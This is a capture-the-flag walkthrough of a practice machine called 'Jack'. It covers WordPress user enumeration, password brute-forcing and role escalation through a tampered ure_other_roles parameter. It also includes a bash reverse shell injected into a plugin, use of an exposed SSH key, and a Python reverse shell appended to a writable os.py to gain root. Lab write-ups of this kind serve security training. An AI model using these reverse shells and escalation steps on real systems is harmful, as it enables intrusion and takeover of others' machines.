# Room: Jack

Difficulty: Hard

## Initial Setup

Before I start, I added jack.thm to my /etc/hosts.

## Nmap Enumeration

When doing pentesting, it is great to start by using nmap to enumerate open ports.
``` bash
nmap -sC -sV TARGET_IP
```
Result:
``` bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e:79:78:08:93:31:d0:83:7f:e2:bc:b6:14:bf:5d:9b (RSA)
|   256 3a:67:9f:af:7e:66:fa:e3:f8:c7:54:49:63:38:a2:93 (ECDSA)
|_  256 8c:ef:55:b0:23:73:2c:14:09:45:22:ac:84:cb:40:d2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Jack&#039;s Personal Site – Blog for Jack's writing adventures
|_http-generator: WordPress 5.3.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Nmap showed valuable results as it revealed the WordPress version.

## Web Enumeration

Visiting the website reveals Jack's personal blog, so I assume that jack is a valid user that I can use when running wpscan.

I started enumerating for hidden directories and found /admin, which redirects to wp-login.php.

## Username Enumeration

I began enumerating for valid usernames using:
``` bash
wpscan --url http://jack.thm --enumerate u
```
Found:
```
jack
wendy
danny
```
## Password Brute Force

I began bruteforcing these users using:
``` bash
wpscan --url http://jack.thm/ --usernames jack,wendy,danny --passwords wordlists.txt
```
Found credentials:
``` bash
wendy / changelater
```
## Privilege Escalation (WordPress)

Upon investigating, user wendy has low privilege. I checked the hint and it says ure_other_roles, which suggests modifying roles.

On Wendy’s profile update, I intercepted the request using Burp Suite and added:
```
&ure_other_roles=administrator
```
It worked, and I gained administrator privileges.

## Gaining Reverse Shell

Since I am now an admin, I visited the Plugin Editor to exploit the Hello Dolly plugin.

I added the following reverse shell:
``` php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'");
```
I started a listener and then activated the Hello Dolly plugin.

Now I am www-data.

## User Flag

I grabbed the flag at:
``` bash
/home/jack/user.txt
```
## LinPEAS Enumeration

I transferred linpeas and found:
``` bash
/var/backups/id_rsa
```
It was readable so i grabbed the key and saved it locally, then fixed permissions:
``` bash
chmod 600 id_rsa
```
Then accessed via SSH:
``` bash
ssh -i id_rsa jack@TARGET_IP
```
Now I am jack.

## Privilege Escalation (Python Path Abuse)

I started basic enumeration. Nothing really useful, but the room gives a hint: “Python”
``` bash
cd /opt
ls
statuscheck
cd statuscheck
ls
```
Found:
``` bash
checker.py  output.log
```
``` bash
cat checker.py
```
Result:
``` python
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```
## Exploiting Writable Python Module

I searched for the location of the os module and found it is writable:
``` bash
ls -l /usr/lib/python2.7/os.py

-rw-rw-r-x 1 root family 25908 Nov 16  2020 /usr/lib/python2.7/os.py
```
I opened os.py and inserted a reverse shell at the end:
``` bash
import socket
import pty
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("YOUR_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```
## Root Access

I opened a listener and waited. After execution, I gained access.

Now I am root 

Final flag found at:
``` bash
/root/root.txt
```

# Attack Chain
The attack began with Nmap enumeration, revealing a WordPress 5.3.2 instance running on the target. Using WPScan, valid usernames were discovered and weak credentials were brute-forced, exploiting poor password security to gain access as a low-privileged user. Privilege escalation was achieved by abusing the ure_other_roles parameter via Burp Suite, indicating a misconfigured or vulnerable User Role Editor functionality that allowed unauthorized role escalation. With administrator access, remote code execution (RCE) was obtained through the plugin editor by injecting a reverse shell. Post-exploitation enumeration using LinPEAS revealed an exposed SSH private key in backups, demonstrating sensitive data exposure. This enabled access to the jack user. Finally, privilege escalation to root was achieved by exploiting a world-writable Python module (os.py), a misconfiguration that allowed arbitrary code execution with elevated privileges, resulting in full system compromise.

```
Nmap Scan
   ↓
WordPress 5.3.2 Identified
   ↓
WPScan → User Enumeration
   ↓
Brute Force Attack
(Vulnerability: Weak Credentials)
   ↓
Login as wendy (Low Privilege)
   ↓
Privilege Escalation via ure_other_roles
(Vulnerability: Improper Access Control / Role Misconfiguration)
   ↓
Admin Access → Plugin Editor Exploit
(Vulnerability: Authenticated RCE)
   ↓
Reverse Shell (www-data)
   ↓
LinPEAS Enumeration
   ↓
SSH Key Found (/var/backups/id_rsa)
(Vulnerability: Sensitive Data Exposure)
   ↓
SSH Access as jack
   ↓
Writable os.py Exploited
(Vulnerability: Insecure File Permissions → Privilege Escalation)
   ↓
Root Shell → Full Compromise
```
